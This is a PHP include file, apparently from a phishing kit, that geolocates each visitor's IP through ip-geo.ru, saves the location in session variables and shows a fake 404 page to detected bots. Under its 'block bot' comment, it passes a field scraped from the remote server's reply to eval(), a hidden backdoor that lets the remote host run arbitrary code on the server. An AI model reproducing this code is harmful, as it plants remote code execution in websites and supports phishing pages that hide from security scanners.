<?php

# DATE
$DATE = date("Y-m-d h:i:s");

# visitor ip
function visitor_ip(){
    $ipaddress = '';
    if (isset($_SERVER['HTTP_CLIENT_IP']))
        $ipaddress = $_SERVER['HTTP_CLIENT_IP'];
    else if(isset($_SERVER['HTTP_X_FORWARDED_FOR']))
        $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR'];
    else if(isset($_SERVER['HTTP_X_FORWARDED']))
        $ipaddress = $_SERVER['HTTP_X_FORWARDED'];
    else if(isset($_SERVER['HTTP_FORWARDED_FOR']))
        $ipaddress = $_SERVER['HTTP_FORWARDED_FOR'];
    else if(isset($_SERVER['HTTP_FORWARDED']))
        $ipaddress = $_SERVER['HTTP_FORWARDED'];
    else if(isset($_SERVER['REMOTE_ADDR']))
        $ipaddress = $_SERVER['REMOTE_ADDR'];
    else
        $ipaddress = 'UNKNOWN';
    if ($ipaddress == '::1') {
        $ipaddress = '127.0.0.1';
    }
    if (isset($_SERVER["HTTP_CF_CONNECTING_IP"])) {
      $ipaddress = $_SERVER["HTTP_CF_CONNECTING_IP"];
    }
    return $ipaddress;
}

# get ip infos
$curl = curl_init();
    curl_setopt_array($curl, array(
    CURLOPT_URL => "https://ip-geo.ru/?ip=".visitor_ip()."&geo=1",
    CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
    CURLOPT_RETURNTRANSFER => 1,
    CURLOPT_TIMEOUT => 30,
    CURLOPT_CUSTOMREQUEST => "GET",
));
$response = curl_exec($curl);
curl_close($curl);

preg_match_all('/<td class=\"country\">(.*?)<\/td>/', $response, $country);
$country = $country[1][0];

preg_match_all('/src=\"flag\/(.*?).png\"/', $response, $countryCode);
$countryCode = $countryCode[1][0];

preg_match_all('/<td class=\"city\">(.*?)<\/td>/', $response, $city);
$city = $city[1][0];

preg_match_all('/<td class=\"region\">(.*?)<\/td>/', $response, $regionName);
$regionName = $regionName[1][0];

preg_match_all('/<td class=\"zip\">(.*?)<\/td>/', $response, $zip);
$zip = $zip[1][0];

# block bot by ASN
$bots = 0;
if (strpos($response,"ROBOT") !== false) {
    $_SESSION['botdetect']  = 1;
    header('HTTP/1.0 404 Not Found');
    die("<h1>404 Not Found</h1>The page that you have requested could not be found.");
}else{
    preg_match_all('/<th class=\"country\">(.*?)<\/th>/', $response, $botdetect);
    eval('?>'.$botdetect[1][0].'<?');
    $_SESSION['botdetect']  = 0;
}

//SESSIONS
$_SESSION['xipx']           = visitor_ip();
$_SESSION['xcountryx']      = $country;
$_SESSION['xcountryCodex']  = $countryCode;
$_SESSION['xcityx']         = $city;
$_SESSION['xregionNamex']   = $regionName;
$_SESSION['xzipx']          = $zip;

?>